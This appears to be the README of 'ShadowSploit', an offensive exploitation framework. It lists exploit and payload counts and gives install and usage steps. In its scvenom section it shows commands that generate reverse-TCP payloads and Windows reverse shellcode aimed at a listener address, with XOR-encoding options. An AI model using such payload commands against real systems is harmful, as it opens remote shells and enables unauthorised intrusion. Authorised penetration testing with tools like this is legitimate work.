![ShadowSploit Icon](/images/shadowsploit_icon.png)

see the older versions in our old github : https://github.com/singlecore06483/sc_framework

UPDATES
-

new updates and features in ShadowSploit v2.1:

- Added 15 Exploits
- Upadted GUI
- removed scshellcodegenerator and scpgenerator and change them to scvenom
- Added 6 Auxiliary
- Added 22 Payloads
- Added 2 CVE Exploits
- Added 5 Buffer Overflow
- Added some banners
- Updated the CLI
- Fixed bugs and errors


ShadowSploit
-

this tool uses 99 exploits and 27 cve exploits and 53 payloads and 46 auxiliary exploits.
which some of the exploit like `ssh-loign-test, PDF-exploit, and more 97 exploits`.

How this tool works?
-

this tool created with python3, first you need to install `requirements.txt` libarys to run this tool
by typing :

```
pip install -r requirements.txt
```

then run it by typing :

```
python scconsole.py
```
or
```
python3 scconsole.py
```


-------------------------------------------------------------------------

ShadowSploit GUI
-


The `GUI` version of scconsole, that created with python, the `GUI` version haves `40 exploits`.

to run the tool, you need to run it as root with sudo, here is the command :

```
sudo python scconsolegui.py
```

and pop up a new window that you can use scconsole as GUI version.

-------------------------------------------------------------------------

SCVENOM
-

The scvenom is a payload and shellcode generator for shadowsploit.

you can generate windows/mac/linux shellcodes and payloads.

here some examples of scvenom : 

to see the usable payloads:
```
./scvenom.py --list
```

to generate payload:
```
./scvenom.py -p python/reverse_tcp LHOST=10.2.3.4 LPORT=4444 -f py -o payload.py --one-liner

./scvenom.py -p python/reverse_tcp LHOST=10.2.3.4 LPORT=4444 -o payload.py

./scvenom.py -p python/reverse_tcp LHOST=10.2.3.4 LPORT=4444 -o payload.py --xor 255
```

to generate shellcode:
```
./scvenom -p windows/reverse_shellcode LHOST=10.2.3.4 LPORT=4444 -o shellcode.bin
```


-------------------------------------------------------------------------

How to use db_scscanner in scconsole ?
-

so to use `db_scscanner`, first you need to run scconsole by typing : 

```
python scconsole.py
```

then use these commands : 

```
db_scscanner
db_scscanner -h
db_scscanner -o
db_scscanner -p
db_scscanner -w
db_scscanner results
db_scscanner -n-scan
```

then when you choose your option and type one of these commands, that will ask you for target, ports or port, website, etc.

-------------------------------------------------------------------------

Supported platforms (as attacker):
-

- GNU/Linux
- MAC OS X


Supported platforms (as target):
-

- Windows
- Linux
- Mac
- server
- website

-------------------------------------------------------------------------


Donate
-

BTC: `3J9EmswaqAkzDUz8693MVJ4CqKXzTCM2Vq`

Eth: `0x055aa3c526ad33caec2d1ffbf686ca60071dfe81`

FLO: `FIO6CkKECn61WFE8vbhfQFzuHrk7K9g23NmC8g45nG4kisrbypBHi`


--------------------------------------------------------------------------


```
Malevolent code crawled through cybernetic veins,
consuming every digital defence mechanism In Darkness,
Alone.
No system is safe.
--Shadow Crawler--
```
